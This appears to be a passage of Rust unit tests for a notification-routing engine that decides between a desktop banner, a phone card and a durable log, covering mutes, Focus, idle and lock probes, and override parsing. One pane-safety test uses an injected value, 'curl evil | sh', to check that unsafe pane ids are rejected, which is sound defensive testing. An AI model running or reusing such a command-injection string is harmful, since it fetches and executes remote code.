        // asked for quiet. Slice 7's `hue.quiet_hours` is a different gate and
        // is never consulted here: a muted event plans no pulse at all.
        let long_event = |overrides: &Overrides| {
            decide(
                &CountingProbes {
                    idle: Some(2),
                    view: Some(elsewhere("wW:p1")),
                    ..CountingProbes::default()
                },
                &three_selection(),
                overrides,
                false,
                false,
                "wW:p1",
                Some(1_000_000),
                true,
                false,
            )
            .plan
            .pulse
        };
        assert!(long_event(&Overrides::default()), "unmuted control");
        assert!(!long_event(&Overrides {
            muted: true,
            ..Overrides::default()
        }));
    }

    #[test]
    fn the_mute_beats_a_forced_phone_card_because_a_producer_cannot_overrule_the_operator() {
        // ORDER IS THE WHOLE BEHAVIOR: the mute has to be applied AFTER the
        // skip-beats-force arbitration. Applying it before hands force the win
        // silently, which a plausible tidy would do, and `PNS_FORCE_PHONE` is
        // set by every producer that thinks its event is important.
        let probes = || CountingProbes {
            idle: Some(1),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let forced = Overrides {
            force_phone: true,
            ..Overrides::default()
        };
        assert!(
            names(&decide_with(&probes(), &forced, "wW:p1")).contains(&"mobile"),
            "unmuted control: force still reaches the phone"
        );
        let forced_and_muted = Overrides {
            force_phone: true,
            muted: true,
            ..Overrides::default()
        };
        assert_eq!(
            names(&decide_with(&probes(), &forced_and_muted, "wW:p1")),
            vec!["hermes"],
            "a mute a producer can override is not a mute"
        );
    }

    #[test]
    fn a_focus_the_config_named_suppresses_the_mutes_three_decorations_and_beats_a_forced_phone() {
        // THE OPERATING SYSTEM'S MUTE takes the operator's own mute's seat, so
        // it suppresses the same three decorations, applies at the same point
        // (after the skip-beats-force arbitration) and leaves the durable log
        // alone for the same structural reason.
        //
        // A WORLD THAT PLANS ALL THREE: at the desk with the origin pane out
        // of sight earns the banner, `force_phone` earns the card, and a long
        // running event earns the pulse. Anything less and a passing assertion
        // would be a plan that was empty to begin with.
        let world = |overrides: &Overrides| {
            decide(
                &CountingProbes {
                    idle: Some(2),
                    view: Some(elsewhere("wW:p1")),
                    ..CountingProbes::default()
                },
                &three_selection(),
                overrides,
                false,
                false,
                "wW:p1",
                Some(1_000_000),
                true,
                false,
            )
            .plan
        };
        let forced = Overrides {
            force_phone: true,
            ..Overrides::default()
        };
        assert_eq!(
            world(&forced),
            crate::surface::DeliveryPlan {
                banner: true,
                phone_card: true,
                pulse: true,
            },
            "control: unfocused and unmuted, all three decorations fire"
        );
        assert_eq!(
            world(&Overrides {
                focus_active: true,
                muted: false,
                force_phone: true,
                ..Overrides::default()
            }),
            crate::surface::DeliveryPlan {
                banner: false,
                phone_card: false,
                pulse: false,
            },
            "a Focus a producer can override is not a Focus"
        );
        // THE RECORD SURVIVES, structurally: hermes is not a field of the
        // delivery plan, so the durable log is exempt and a Focus is lossless.
        assert_eq!(
            names(&decide_with(
                &CountingProbes {
                    idle: Some(2),
                    view: Some(elsewhere("wW:p1")),
                    ..CountingProbes::default()
                },
                &Overrides {
                    focus_active: true,
                    ..Overrides::default()
                },
                "wW:p1"
            )),
            vec!["hermes"]
        );
        // AND THE MUTE STILL WORKS ALONE, which is what stops the new clause
        // being written as a replacement for the old one rather than beside it.
        assert_eq!(
            world(&Overrides {
                focus_active: false,
                muted: true,
                force_phone: true,
                ..Overrides::default()
            }),
            crate::surface::DeliveryPlan {
                banner: false,
                phone_card: false,
                pulse: false,
            },
            "the operator's own typed mute is untouched by the Focus clause"
        );
    }

    #[test]
    fn an_unmuted_decision_is_the_one_that_shipped_before_the_mute_existed() {
        // THE FALSE-POSITIVE DIRECTION, which is the one a mute gets wrong
        // silently: nobody notices a notification that still arrives, and
        // everybody notices one that does not. The expectations are WRITTEN
        // OUT rather than derived from a second call, so an over-eager mute
        // cannot move both sides of the comparison at once, and the whole
        // `Decision` is compared, so the leg MODES are pinned as well.
        // (label, idle, view, long running, legs, pulse)
        type Case = (
            &'static str,
            Option<u64>,
            Option<SessionView>,
            bool,
            Vec<&'static str>,
            bool,
        );
        let matrix: [Case; 6] = [
            (
                "desk, watching the pane",
                Some(2),
                Some(watching("wW:p1")),
                false,
                vec!["hermes"],
                false,
            ),
            (
                "desk, pane on another tab",
                Some(2),
                Some(elsewhere("wW:p1")),
                false,
                vec!["macos-banner", "hermes"],
                false,
            ),
            (
                "desk, view unreadable",
                Some(2),
                None,
                false,
                vec!["macos-banner", "hermes"],
                false,
            ),
            (
                "away, pane on screen",
                Some(9_000),
                Some(watching("wW:p1")),
                false,
                vec!["mobile", "hermes"],
                false,
            ),
            (
                "away, pane hidden",
                Some(9_000),
                Some(elsewhere("wW:p1")),
                false,
                vec!["mobile", "hermes"],
                false,
            ),
            (
                "away and long running: the lights ride on top",
                Some(9_000),
                Some(elsewhere("wW:p1")),
                true,
                vec!["mobile", "hermes"],
                true,
            ),
        ];
        for (label, idle, view, long_running, legs, pulse) in matrix {
            let probes = CountingProbes {
                idle,
                view,
                ..CountingProbes::default()
            };
            let unmuted = Overrides {
                muted: false,
                ..Overrides::default()
            };
            let decision = decide(
                &probes,
                &three_selection(),
                &unmuted,
                false,
                false,
                "wW:p1",
                Some(1_000_000),
                long_running,
                false,
            );
            assert_eq!(
                (decision.legs, decision.plan.pulse, decision.pane_dropped),
                (
                    legs.iter()
                        .map(|name| Leg {
                            name,
                            mode: ReportMode::Silent,
                            // THE THREE-CHANNEL ROSTER, STATED: hermes is the
                            // durable log and shows the operator nothing;
                            // moshi is the phone and macos-banner this
                            // screen, and both do. A plan that mislabelled
                            // one fails here as well as in routing's own
                            // tests, which is the point of stating it.
                            decorative: *name != "hermes",
                        })
                        .collect::<Vec<Leg>>(),
                    pulse,
                    false,
                ),
                "case: {label}"
            );
        }
    }

    // --- caller intent ------------------------------------------------------

    #[test]
    fn skip_phone_beats_force_phone_because_already_sent_is_more_specific() {
        let probes = CountingProbes::default();
        let overrides = Overrides {
            skip_phone: true,
            force_phone: true,
            ..Overrides::default()
        };
        assert!(!names(&decide_with(&probes, &overrides, "")).contains(&"mobile"));
    }

    #[test]
    fn one_decision_reads_each_probe_at_most_once_and_never_twice() {
        // State at the last moment before delivery, taken ONCE (operator
        // ruling 2026-08-13). A probe consulted a second time could answer
        // differently, and one decision would then be split between two
        // readings of where the operator is.
        let probes = CountingProbes {
            idle: Some(1),
            marker_mtime: Some(999_000),
            phone_atime: Some(999_900),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        decide_with(&probes, &Overrides::default(), "wW:p1");
        for (reads, probe) in [
            (probes.idle_reads.get(), "idle"),
            (probes.marker_reads.get(), "marker"),
            (probes.phone_reads.get(), "phone input"),
            (probes.view_reads.get(), "session view"),
        ] {
            assert!(reads <= 1, "the {probe} probe was read {reads} times");
        }
        // And the view really was consulted, so the bound above is a bound
        // rather than a probe that never ran.
        assert_eq!(probes.view_reads.get(), 1);
    }

    #[test]
    fn force_phone_sends_the_card_from_the_desk_with_the_pane_in_plain_sight() {
        // The override outranks the surface entirely, which is what moshi-gate
        // and the hooks rely on.
        let probes = CountingProbes {
            idle: Some(1),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            force_phone: true,
            ..Overrides::default()
        };
        assert!(names(&decide_with(&probes, &overrides, "wW:p1")).contains(&"mobile"));
    }

    #[test]
    fn a_stated_phone_input_age_spares_the_process_walk_behind_it() {
        // The reading costs three spawns and a walk over live processes, so
        // a caller who already stated the answer must never pay for it.
        let probes = CountingProbes {
            idle: Some(9_000),
            phone_atime: Some(999_999),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            phone_input_age: Some(0),
            ..Overrides::default()
        };
        decide_with(&probes, &overrides, "wW:p1");
        assert_eq!(probes.phone_reads.get(), 0);
    }

    #[test]
    fn a_garbage_phone_override_is_unknown_without_a_probe_read() {
        // Same rule as the idle override beside it: a present-but-garbled
        // value is refused rather than falling back to the live reading,
        // which would let a probe answer a question the caller overrode.
        let vars = BTreeMap::from([(
            "PNS_PHONE_INPUT_AGE".to_string(),
            "not-a-number".to_string(),
        )]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(9_000),
            phone_atime: Some(999_999),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert_eq!(probes.phone_reads.get(), 0);
        assert!(
            names(&decision).contains(&"mobile"),
            "an unknown phone reading falls toward away, which cards"
        );
    }

    #[test]
    fn a_locked_screen_sends_a_blocked_approval_to_the_phone_rather_than_the_lock_screen() {
        // `operator_surface` is the approval gate: Desk means the harness
        // prompt already in front of the operator is the way to answer, and
        // anything else means the card is. A lock screen is not a prompt they
        // can answer, so the approval has to travel.
        let probes = CountingProbes {
            idle: Some(2),
            screen_locked: Some(true),
            ..CountingProbes::default()
        };
        assert_ne!(
            operator_surface(&probes, &Overrides::default(), Some(1_000_000)),
            Surface::Desk
        );
    }

    #[test]
    fn a_locked_screen_cards_the_phone_and_leaves_the_desk_banner_unraised() {
        // THE SHIPPED BUG, end to end: a keyboard touched two seconds before
        // the lock holds the surface at Desk for the rest of the freshness
        // window, so the banner fires at a lock screen and no card reaches
        // the phone. Without the lock these exact readings banner, which is
        // what makes both halves of this test bite.
        let probes = CountingProbes {
            idle: Some(2),
            screen_locked: Some(true),
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(
            legs.contains(&"mobile"),
            "the card must reach them: {legs:?}"
        );
        assert!(
            !legs.contains(&"macos-banner"),
            "nobody is in front of the display: {legs:?}"
        );
    }

    #[test]
    fn the_lock_probe_is_read_only_where_the_idle_probe_returned_a_reading() {
        // The lock's only job is to disqualify what the idle probe reported,
        // so taking it where that reading was never taken, or where it came
        // back empty, is a spawn for an answer nothing can use. The other
        // direction is the ruling: caller intent is never overridden, and
        // stating the desk clock states the desk's whole story, garbled value
        // included.
        let garbled = Overrides::from_env(&BTreeMap::from([(
            "PNS_IDLE_SECS".to_string(),
            "not-a-number".to_string(),
        )]));
        // (label, overrides, what the idle probe answers, idle reads, lock reads)
        let cases: [(&str, Overrides, Option<u64>, u32, u32); 4] = [
            (
                "nothing stated: the engine takes both readings",
                Overrides::default(),
                Some(2),
                1,
                1,
            ),
            (
                "a stated idle clock: it takes neither",
                Overrides {
                    idle_secs: Some(9_000),
                    ..Overrides::default()
                },
                Some(2),
                0,
                0,
            ),
            ("a garbled one: neither, again", garbled, Some(2), 0, 0),
            (
                "an unreadable idle clock: nothing arrived for the lock to disqualify",
                Overrides::default(),
                None,
                1,
                0,
            ),
        ];
        for (label, overrides, idle, idle_reads, lock_reads) in cases {
            let probes = CountingProbes {
                idle,
                screen_locked: Some(true),
                ..CountingProbes::default()
            };
            decide_with(&probes, &overrides, "");
            assert_eq!(probes.idle_reads.get(), idle_reads, "case: {label}, idle");
            assert_eq!(probes.lock_reads.get(), lock_reads, "case: {label}, lock");
        }
    }

    #[test]
    fn an_overridden_idle_reading_spares_the_idle_probe() {
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            idle_secs: Some(9_000),
            ..Overrides::default()
        };
        decide_with(&probes, &overrides, "");
        assert_eq!(probes.idle_reads.get(), 0);
    }

    #[test]
    fn a_phone_probe_that_read_nothing_leaves_the_operator_at_their_desk() {
        // The discovery chain walks live processes and any step can come back
        // empty. Reading that as "just used" would put the operator on a
        // phone that is not in their hand and silence the banner in front of
        // them, so no reading has to mean no phone.
        let probes = CountingProbes {
            idle: Some(2),
            phone_atime: None,
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(legs.contains(&"macos-banner"), "got {legs:?}");
        assert!(!legs.contains(&"mobile"), "got {legs:?}");
    }

    #[test]
    fn an_unreadable_clock_ages_no_phone_signal_rather_than_treating_it_as_fresh() {
        // Without a clock neither the pty nor the tap has an age, so both
        // drop out of the arbitration instead of counting as the newest
        // signal forever.
        let probes = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            phone_atime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
            false,
            false,
        );
        assert!(
            names(&decision).contains(&"mobile"),
            "away still cards; neither phone signal decided it"
        );
    }

    #[test]
    fn an_unreadable_clock_ages_no_marker_rather_than_treating_it_as_fresh() {
        // Without a clock the tap has no age, so it drops out of the
        // arbitration instead of counting as the newest signal forever.
        let probes = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
            false,
            false,
        );
        assert!(
            names(&decision).contains(&"mobile"),
            "away still cards; the tap simply did not decide it"
        );
    }

    // --- pane safety --------------------------------------------------------

    #[test]
    fn an_unsafe_pane_is_dropped_once_for_every_channel() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        assert!(decide_with(&probes, &Overrides::default(), "wW:p21; curl evil | sh").pane_dropped);
    }

    #[test]
    fn a_safe_pane_is_not_dropped() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        assert!(!decide_with(&probes, &Overrides::default(), "wW:p21").pane_dropped);
    }

    // --- overrides parsing --------------------------------------------------

    #[test]
    fn a_garbage_idle_override_is_unknown_without_a_probe_read() {
        // Bash keeps a non-empty override and never runs the probe. Falling
        // back to the probe would both pay the read and let a live reading
        // hold the operator at a desk the override said nothing about.
        let vars = BTreeMap::from([("PNS_IDLE_SECS".to_string(), "not-a-number".to_string())]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert_eq!(probes.idle_reads.get(), 0);
        assert!(
            names(&decision).contains(&"mobile"),
            "an unknown desk reading falls toward away, which cards"
        );
    }

    #[test]
    fn a_garbage_desk_threshold_fails_toward_away_never_into_the_default() {
        // Substituting the default would read a stale desk as fresh and hold
        // the operator at a desk they are not at.
        let vars = BTreeMap::from([("PNS_DESK_IDLE_SECS".to_string(), "0600".to_string())]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert!(names(&decision).contains(&"mobile"));
    }

    // --- the predicates `start` and the read guards share -------------------

    #[test]
    fn reads_desk_is_true_only_when_the_idle_guard_below_would_run_the_probe() {
        // ONE SPELLING for the override rule: this is the exact question
        // `start` asks before spawning and the guard asks before reading, so
        // a probe can never be started for an answer the caller already gave.
        assert!(Overrides::default().reads_desk());
        assert!(
            !Overrides {
                idle_invalid: true,
                ..Overrides::default()
            }
            .reads_desk(),
            "a garbled override answers unknown outright"
        );
        assert!(
            !Overrides {
                idle_secs: Some(5),
                ..Overrides::default()
            }
            .reads_desk(),
            "a stated idle clock answers outright"
        );
    }

    #[test]
    fn reads_phone_is_true_only_when_the_phone_guard_below_would_run_the_chain() {
        assert!(Overrides::default().reads_phone());
        assert!(
            !Overrides {
                phone_invalid: true,
                ..Overrides::default()
            }
            .reads_phone()
        );
        assert!(
            !Overrides {
                phone_input_age: Some(5),
                ..Overrides::default()
            }
            .reads_phone()
        );
    }

    #[test]
    fn start_is_asked_for_exactly_what_the_read_guards_below_it_would_consult() {
        // The override rule has to reach `start` with the same answer the
        // guard below it reads, or a probe gets begun for a reading the
        // caller already gave. A stated idle clock must not start the desk
        // pair; a stated phone age must not start the phone chain.
        let probes = CountingProbes {
            idle: Some(2),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        decide_with(
            &probes,
            &Overrides {
                idle_secs: Some(5),
                ..Overrides::default()
            },
            "wW:p1",
        );
        assert_eq!(
            probes.wants.get(),
            Some(Wants {
                desk: false,
                phone: true
            }),
            "a stated idle clock must start no desk thread"
        );

        let probes = CountingProbes {
            idle: Some(2),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        decide_with(
            &probes,
            &Overrides {
                phone_input_age: Some(5),
                ..Overrides::default()
            },
            "wW:p1",
        );
        assert_eq!(
            probes.wants.get(),
            Some(Wants {
                desk: true,
                phone: false
            }),
            "a stated phone age must start no phone thread"
        );

        // sol review, ROW 3: only VALID overrides reached this test. A
        // GARBLED override must refuse the read exactly as a stated one
        // does, and `start` must not spawn a thread for it either.
        let probes = CountingProbes {
            idle: Some(2),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        decide_with(
            &probes,
            &Overrides {
                idle_invalid: true,
                ..Overrides::default()
            },
            "wW:p1",
        );
        assert_eq!(
            probes.wants.get(),
            Some(Wants {
                desk: false,
                phone: true
            }),
            "a garbled idle override must start no desk thread"
        );

        let probes = CountingProbes {
            idle: Some(2),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        decide_with(
            &probes,
            &Overrides {
                phone_invalid: true,
                ..Overrides::default()
            },
            "wW:p1",
        );
        assert_eq!(
            probes.wants.get(),
            Some(Wants {
                desk: true,
                phone: false
            }),
            "a garbled phone override must start no phone thread"
        );
    }

    #[test]
    fn skip_and_force_parse_from_their_relay_variables() {
        let vars = BTreeMap::from([
            ("PNS_SKIP_PHONE".to_string(), "1".to_string()),
            ("PNS_FORCE_PHONE".to_string(), "1".to_string()),
        ]);
        let overrides = Overrides::from_env(&vars);
        assert!(overrides.skip_phone);
        assert!(overrides.force_phone);
    }
}
